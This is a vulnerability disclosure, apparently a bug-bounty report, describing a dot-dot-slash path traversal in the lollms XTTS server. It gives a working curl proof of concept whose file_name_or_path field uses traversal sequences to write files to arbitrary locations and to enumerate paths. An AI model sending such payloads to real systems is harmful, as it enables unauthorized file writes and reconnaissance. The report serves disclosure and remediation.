Title: Dot-dot-slash path traversal in XTTS server in parisneo/lollms

Proof of Concept: 
curl -X POST -H "Content-Type: application/json" -d '{"text": "Hello, world!", "speaker_wav": "../../../services/xtts/voices/main_voice.wav", "language": "en", "file_name_or_path": "../../../../../../../../../../../../../../../../home/elias/HACKED.wav"}' http://localhost:8020/tts_to_file

This will write a wav file to an arbitrary location on the system. It is also possible enumerate file paths (an error message will be shown if the speaker voice file does not exist)

Note: If the exploit does not work, it may be necessary to install and start the XTTS system using /install_xtts and /start_xtts endpoins, which should launch the server on port 8020. On my system, I also had to patch the python executable path in ./lollms-webui/scripts/linux/lollms-webui/lollms_core/lollms/utilities.py to python_path = Path(sys.executable).parent.parent.parent/"miniconda3"/"envs"/env_name/"bin"/"python" to make the installation succeed.

Impact: 
This vulnerability can be abused to write audio files compatible with XTTS to arbitrary locations on the system, and also enumerate such file paths on the system.
